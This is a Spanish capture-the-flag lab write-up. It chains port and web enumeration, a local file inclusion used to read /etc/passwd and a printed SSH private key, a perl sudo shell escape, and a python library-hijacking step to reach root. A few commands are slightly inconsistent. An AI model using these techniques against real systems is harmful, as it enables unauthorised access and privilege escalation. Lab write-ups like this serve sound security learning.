## 1. Reconocimiento de Puertos con Nmap

Un escaneo con `nmap` muestra los puertos 22 (SSH) y 80 (HTTP) abiertos, con Apache httpd 2.4.58 y OpenSSH 9.6p1.

```bash
nmap -sV -O <IP_DEL_OBJETIVO>
```

Esto sugiere que la aplicación web en el puerto 80 será el punto de entrada principal.

## 2. Enumeración Web

Al acceder a la página web, se observa un mensaje de "By TLuisillo_o" y un "[!] ERROR [!]". Esto indica que la página podría requerir un parámetro.

Enumerar las versiones del servidor web para buscar posibles exploits

**Comando**
```bash
whatweb http://172.17.0.2
```
**Salida**
```
http://172.17.0.2 [200 OK] Apache[2.4.58], Bootstrap,Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Script, Title[4You]
```

### 2.1. Búsqueda de Directorios y Fuzzing de Parámetros

Utilizamos `gobuster` para encontrar directorios (`/assets/`, `/index.php/`). El archivo `index.php` es interesante porque, al ser PHP, puede aceptar parámetros.
```bash
gobuster dir -u http://172.17.0.2 -w /home/eduard/WordList/directories.txt 
```

Para identificar un parámetro oculto, usamos `wfuzz`:

```bash
wfuzz -c --hl=62 -w /path/to/wordlist/big.txt 'http://<IP_DEL_OBJETIVO>/index.php?FUZZ=/etc/passwd'
```

con ?FUZZ=/etc/passwd es la única forma con la que el servidor responde distinto
**salida**
```bash
=====================================================================  
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================  
  
000002402:   200        88 L     199 W      3870 Ch     "secret"
```
El fuzzing revela el parámetro `secret`. Al acceder a `http://<IP_DEL_OBJETIVO>/index.php?secret=/etc/passwd`, se muestra el contenido del archivo `/etc/passwd`, confirmando una vulnerabilidad de **LFI**. Existen los usuarios `vaxei` y `luisillo`.


al buscar en el navegador 
http://172.17.0.2/index.php?secret=/etc/passwd
en vez de salir un mensaje de error, sale mucha información 
Este contenido es la salida del archivo `/etc/passwd`, un archivo estándar en sistemas Linux que contiene **información sobre las cuentas de usuario**.
- root
- ubuntu
- vaxei
- luisillo

### ssh
Con la vulnerabilidad LFI, podemos intentar leer archivos sensibles del sistema. Conociendo el nombre del usuario (vaxei) y acceso a un navegador con una vulnerabilidad de LFI (Local File Inclusion), puedes intentar acceder a la ruta /home/vaxei/.ssh/id_rsa a través de la URL vulnerable. Si el archivo es accesible, podremos descargar la clave privada RSA, guardarla localmente y usarla para autenticarse por SSH como vaxei, sin necesidad de contraseña.

Buscamos:
```bash
http://<IP_DEL_OBJETIVO>/index.php?secret=../../../home/vaxei/.ssh/id_rsa
```

**Salida**
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvbN4ZOaACG0wA5LY+2RlPpTmBl0vBVufshHnzIzQIiBSgZUED5Dk
2LxNBdzStQBAx6ZMsD+jUCU02DUfOW0A7BQUrP/PqrZ+LaGgeBNcVZwyfaJlvHJy2MLVZ3
tmrnPURYCEcQ+4aGoGye4ozgao+FdJElH31t10VYaPX+bZX+bSxYrn6vQp2Djbl/moXtWF
ACgDeJGuYJIdYBGhh63+E+hcPmZgMvXDxH8o6vgCFirXInxs3O03H2kB1LwWVY9ZFdlEh8
t3QrmU6SZh/p3c2L1no+4eyvC2VCtuF23269ceSVCqkKzP9svKe7VCqH9fYRWr7sssuQqa
OZr8OVzpk7KE0A4ck4kAQLimmUzpOltDnP8Ay8lHAnRMzuXJJCtlaF5R58A2ngETkBjDMM
2fftTd/dPkOAIFe2p+lqrQlw9tFlPk7dPbmhVsM1CN+DkY5D5XDeUnzICxKHCsc+/f/cmA
UafMqBMHtB1lucsW/Tw2757qp49+XEmic3qBWes1AAAFiGAU0eRgFNHkAAAAB3NzaC1yc2
EAAAGBAL2zeGTmgAhtMAOS2PtkZT6U5gZdLwVbn7IR58yM0CIgUoGVBA+Q5Ni8TQXc0rUA
QMemTLA/o1AlNNg1HzltAOwUFKz/z6q2fi2hoHgTXFWcMn2iZbxyctjC1Wd7Zq5z1EWAhH
EPuGhqBsnuKM4GqPhXSRJR99bddFWGj1/m2V/m0sWK5+r0Kdg425f5qF7VhQAoA3iRrmCS
HWARoYet/hPoXD5mYDL1w8R/KOr4AhYq1yJ8bNztNx9pAdS8FlWPWRXZRIfLd0K5lOkmYf
6d3Ni9Z6PuHsrwtlQrbhdt9uvXHklQqpCsz/bLynu1Qqh/X2EVq+7LLLkKmjma/Dlc6ZOy
hNAOHJOJAEC4pplM6TpbQ5z/AMvJRwJ0TM7lySQrZWheUefANp4BE5AYwzDNn37U3f3T5D
gCBXtqfpaq0JcPbRZT5O3T25oVbDNQjfg5GOQ+Vw3lJ8yAsShwrHPv3/3JgFGnzKgTB7Qd
ZbnLFv08Nu+e6qePflxJonN6gVnrNQAAAAMBAAEAAAGADK57QsTf/priBf3NUJz+YbJ4NX
5e6YJIXjyb3OJK+wUNzvOEdnqZZIh4s7F2n+VY70qFlOtkLQmXtfPIgcEbjyyr0dbgw0j4
4sRhIwspoIrVG0NTKXJojWdqTG/aRkOgXKxsmNb+snLoFPFoEUHZDjpePFcgyjXlaYmZ0G
+bzNv0RNgg4eWZszE13jvb5B8XtDzN4pkGlGvK1+8bInlguLmktQKItXoVhhokGkp4b+fu
7YjDiaS4CyWsxX50wG/ZMgYBwFLRbCDUUdKZxsmCbreHxLKT/sae64E2ahuBSckYZlIzTd
2lp27EOOPvdPlt9gny83JuFHBLChMd4sHq/oU8vGAiGnIvOCWs4wMArbpJQ+EALJk3GYvh
oqWp3Q4N4F1tmwlrbqX2KP2T5yB+rLoBxfJwLELZlzd+O8mfP9Yknaw2vVYpUixUglNWHJ
ZnmN1uAScPAd1ZNvIkPm6IPcThj1hVCkFXgWjQn6NdJj+NGNWcBeUrxBkH0vToD7gfAAAA
wQCvSzmVYSxpX3b9SgH+sHH5YmOXR9GSc8hErWMDT9glzcaeEVB3O2iH/T+JrtUlm4PXiP
kwFc5ZHHZTw2dd0X4VpE02JsfkgwTEyqWRMcZHTK19Pry2zskVmu6F94sOcN8154LeQBNx
gT22Dr/KJA71HkOH7TyeGnlsmBtZoa3sqp3co9inkccnhm1KUeduL4RcSysDqXYbBUtNB6
G1l8HYysm8ISCsoR4KSgxmC5lqCMfBy7z/6nOX7sm5/kP+JMsAAADBAO8TiHrYTl/kGsPM
ITaekvQUJWCp+FCHK07jwzNp4buYAnO3iGvhVQpcS7UboD8/mve207e97ugK4Nqc68SzSu
bDgAnd4FF3NLoXP/qPZPaPS1FRl0pY0jHyB+U6RELgaI34i9AierMc+4M0coUMZvxqay3o
t8jRhz08jiwFifszwNN7taclmNEfkrKBY7nlbxFRd2XLjknZHFUOFzOFWdtXilQa+y6qJ6
lKtE9KWnQgIgZB9Wt+M3lsEVWEdQKN1wAAAMEAyyEsmbLUzkBLMlu6P4+6sUq8f68eP3Ad
bJltoqUjEYwe9KOf07G15W2nwbE/9WeaI1DcSDpZbuOwFBBYlmijeHVAQtJWJgZcpsOyy2
1+JS40QbCBg+3ZcD5NX75S43WvnF+t2tN0S6aWCEqCUPyb4SSQXKi4QBKOMN8eC5XWf/aQ
aNrKPo4BygXUcJCAHRZ77etVNQY9VqdwvI5s0nrTexbHM9Rz6O8T+7qWgsg2DEcTv+dBUo
1w8tlJUw1y+rXTAAAAEnZheGVpQDIzMWRlMDI2NmZmZA==
-----END OPENSSH PRIVATE KEY-----
```

Ahora tenemos el usuario vaxei y su clave, por lo que vamos a acceder usando esas credenciales
Vamos a guardar la clave en un documento y vamos a usar la opción `ssh -i identity_file` para acceder

```bash
touch claveSSHvaxei
vim $_
# pegamos el contenido

ssh -i claveSSHvaxei.txt vaxei@172.17.0.2
whoami # vaxei
```

## 4. Escalada de Privilegios

### 4.1. Escalada a Usuario `luisillo`

```bash
ls
# encontramos un unico documento
cat file.txt
```
**Salida**
```bash
kflksdfsad  
asdsadsad  
asdasd
```
Comprobamos que este fichero no tiene la contraseñas de super usuario

Verificamos los permisos `sudo` del usuario `vaxei` con `sudo -l`. Se encuentra que `vaxei` puede ejecutar `/usr/bin/perl` como el usuario `luisillo` sin contraseña (`NOPASSWD`).

```bash
sudo -l
```

**Salida**

```bash
Matching Defaults entries for vaxei on 4c54b2ceac3c:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,  
   use_pty  
  
User vaxei may run the following commands on 4c54b2ceac3c:  
   (luisillo) NOPASSWD: /usr/bin/perl
```

Puedemos ejecutar perl como el usuario **luisillo**, sin necesidad de contraseña, desde este usuario. Buscamos en GTFOBins y encontramos el siguiente comando

```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
```
- `sudo -u luisillo`: ejecuta el comando siguiente **como el usuario `luisillo`**.
- `/usr/bin/perl -e '...'`: ejecuta código Perl directamente desde la línea de comandos (`-e` significa "execute").
- `'exec "/bin/sh";'`: el código Perl que se ejecuta. Llama a `exec` para reemplazar el proceso Perl por un **shell `/bin/sh`**.

ahora somos luisillo 

### 4.2. Escalada a `root`

comprobamos que la contraseña de luisillo no es ninguna de las que hay en file.txt

```bash
whoami  
# luisillo
bash -p # para una consola interactiva

sudo -l
# User luisillo may run the following commands on 4c54b2ceac3c:  
#   (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```
Como `luisillo`, volvemos a verificar los permisos `sudo` con `sudo -l`. Se observa que `luisillo` puede ejecutar `/usr/bin/python3 /opt/paw.py` como `ALL` (cualquier usuario, incluyendo `root`) sin contraseña.

podemos ejecutar python sin necesidad de contraseña

vamos a ver el script
```bash
cat /opt/paw.py
```
**Salida**
```python
import subprocess  
import os  
import sys
import time  
  
# F  
def dummy_function(data):  
   result = ""  
   for char in data:  
       result += char.upper() if char.islower() else char.lower()  
   return result  
  
# Código para ejecutar el script  
os.system("echo Ojo Aqui")  
  
# Simulación de procesamiento de datos  
def data_processing():  
   data = "This is some dummy data that needs to be processed."  
   processed_data = dummy_function(data)  
   print(f"Processed data: {processed_data}")  
  
# Simulación de un cálculo inútil  
def perform_useless_calculation():  
   result = 0  
   for i in range(1000000):  
       result += i  
   print(f"Useless calculation result: {result}")  
  
def run_command():  
   subprocess.run(['echo Hello!'], check=True)  
  
def main():  
   # Llamadas a funciones que no afectan el resultado final  
   data_processing()  
   perform_useless_calculation()  
      
   # Comando real que se ejecuta  
   run_command()  
  
if __name__ == "__main__":  
   main()
```
intentamos modificar el archivo para ejecutar comandos, pero no tengo permisos

El script importa librerías como `subprocess` sin rutas absolutas. Esto es una vulnerabilidad conocida como "secuestro de librerías" (library hijacking). Python busca las librerías primero en el directorio actual antes de las rutas del sistema.

Para explotar esto, creamos un archivo `subprocess.py` en el mismo directorio donde se ejecutará `paw.py` (en este caso, `/opt/`) con código malicioso que nos dé un shell de `root`:

```bash
touch subprocess.py
echo 'import os\nos.system("/bin/sh")' > subprocess.py
```

Luego, ejecutamos el script `paw.py` con `sudo`:

```bash
sudo /usr/bin/python3 /opt/paw.py
```

Dado que `subprocess.py` se encuentra en el directorio actual, Python lo importará en lugar de la librería legítima, ejecutando nuestro código. 

```bash
whoami # root
```
